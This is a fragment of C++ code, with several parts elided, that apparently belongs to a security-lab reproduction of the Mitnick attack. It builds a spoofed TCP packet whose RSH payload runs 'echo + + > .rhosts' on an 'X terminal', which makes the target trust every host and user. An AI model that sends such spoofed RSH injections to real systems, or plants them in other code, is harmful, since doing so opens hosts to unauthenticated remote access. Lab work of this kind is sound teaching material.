...
public:
    ...
    void sendPacket() {
        ...
        // Add RSH Payload (Stderr Port, Client username, Server username, Command)
	const char* rsh_data = "9090\0seed\0seed\0echo + + > .rhosts\0";
	int rsh_len = strlen("9090") + 1 + strlen("seed") + 1 + strlen("seed") + 1 + strlen("echo + + > .rhosts") + 1; // Null-terminated strings

	memcpy(buff + total_len, rsh_data, rsh_len);
	total_len += rsh_len;
        ...
        tcp->check = htons(tcp_checksum(ip, tcp, sizeof(struct tcphdr) + rsh_len));
        ...
        if (sz < 0) {
            ...
            std::cout << "Successfully sent packet with RSH data to X terminal\n";
        }
    }
};
